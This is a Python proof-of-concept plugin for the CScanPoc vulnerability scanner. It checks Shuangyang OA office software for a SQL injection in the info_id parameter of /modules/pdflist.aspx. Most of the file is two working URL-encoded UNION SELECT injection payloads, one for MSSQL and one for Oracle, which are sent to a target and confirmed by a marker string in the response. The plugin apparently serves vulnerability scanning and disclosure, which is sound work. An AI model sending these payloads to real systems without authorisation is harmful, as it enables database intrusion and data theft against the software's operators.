# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Shuangyang_0004'  # 平台漏洞编号，留空
    name = '双杨OA系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-05-25'  # 漏洞公布时间
    desc = '''
        双杨OA系统是由上海双杨电脑高科技开发公司打造的一款办公一体化管理软件。
        双杨OA系统多处存在SQL注入漏洞：
        /modules/pdflist.aspx?info_id=1
        /modules/pdflist.aspx?info_id=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0116142'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '双杨OA系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '02f18411-7a7e-4531-9988-79ccb5be3fa1'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-0116142
            hh = hackhttp.hackhttp()
            payloads = [
                '/modules/pdflist.aspx?info_id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHAR%28113%29%2bCHAR%2898%29%2bCHAR%28112%29%2bCHAR%28107%29%2bCHAR%28113%29%2bCHAR%28102%29%2bCHAR%2897%29%2bCHAR%2876%29%2bCHAR%28113%29%2bCHAR%28109%29%2bCHAR%2872%29%2bCHAR%2888%29%2bCHAR%28108%29%2bCHAR%28117%29%2bCHAR%2877%29%2bCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28120%29%2bCHAR%28113%29%2bCHAR%28113%29%2CNULL%2CNULL%2CNULL--',
                '/modules/pdflist.aspx?info_id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28102%29%7C%7CCHR%2897%29%7C%7CCHR%2876%29%7C%7CCHR%28113%29%7C%7CCHR%28109%29%7C%7CCHR%2872%29%7C%7CCHR%2888%29%7C%7CCHR%28108%29%7C%7CCHR%28117%29%7C%7CCHR%2877%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--'
            ]
            for payload in payloads:
                url = self.target + payload
                code, head, res, errcode, _ = hh.http(url)
                if 'qbpkqfaLqmHXluMqpxqq' in res:
                    #security_hole(arg + 'modules/pdflist.aspx?info_id=1')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
